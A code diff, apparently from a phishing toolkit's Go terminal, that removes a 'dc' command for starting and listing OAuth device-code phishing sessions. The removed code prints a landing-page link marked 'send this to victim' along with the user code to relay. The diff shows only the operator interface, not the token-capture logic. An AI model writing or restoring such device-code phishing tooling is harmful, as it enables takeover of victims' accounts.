@@ -206,12 +206,6 @@ func (t *Terminal) DoWork() {
 			t.detached = true
 			do_quit = true
 			cmd_ok = true
-		case "dc":
-			cmd_ok = true
-			err := t.handleDeviceCode(args[1:])
-			if err != nil {
-				log.Error("dc: %v", err)
-			}
 		default:
 			log.Error("unknown command: %s", args[0])
 			cmd_ok = true
@@ -2324,55 +2318,4 @@ func (t *Terminal) filterInput(r rune) (rune, bool) {
 		return r, false
 	}
 	return r, true
-}
-
-// handleDeviceCode runs the "dc" command.
-//
-//	dc                      — list all targets + status
-//	dc start [tenant/email] — start a single device code flow
-func (t *Terminal) handleDeviceCode(args []string) error {
-	if len(args) == 0 || args[0] == "list" {
-		targets := GetDCTargets()
-		if len(targets) == 0 {
-			log.Info("no device code sessions")
-			return nil
-		}
-		for _, s := range targets {
-			status := s.GetStatus()
-			elapsed := time.Since(s.StartedAt).Round(time.Second)
-			label := s.Email
-			if label == "" {
-				label = s.Tenant
-			}
-			log.Info("[#%d] %-28s code=%-10s status=%-10s elapsed=%s",
-				s.ID, label, s.UserCode, status, elapsed)
-		}
-		return nil
-	}
-
-	switch args[0] {
-	case "start":
-		target := "common"
-		if len(args) > 1 {
-			target = args[1]
-		}
-		tgt, err := StartDeviceCode(target)
-		if err != nil {
-			return err
-		}
-		lc := color.New(color.FgHiCyan)
-		gc := color.New(color.FgHiGreen)
-		log.Success("device code #%d started (tenant: %s)", tgt.ID, tgt.Tenant)
-		if tgt.LandingToken != "" && GlobalDCCfg != nil && GlobalDCCfg.GetBaseDomain() != "" {
-			landingURL := "http://" + GlobalDCCfg.GetServerExternalIP() + "/dc/" + tgt.LandingToken
-			log.Info("  Landing page : %s  %s", lc.Sprint(landingURL), gc.Sprint("← send this to victim"))
-		}
-		log.Info("  Direct link  : %s?code=%s", lc.Sprint(tgt.VerificationURI), gc.Sprint(tgt.UserCode))
-		log.Info("  Code         : %s", gc.Sprint(tgt.UserCode))
-		log.Info("  Expires in %d seconds. Polling in background...", tgt.ExpiresIn)
-		return nil
-
-	default:
-		return fmt.Errorf("unknown subcommand '%s' — usage: dc [start [tenant|email]]", args[0])
-	}
 }
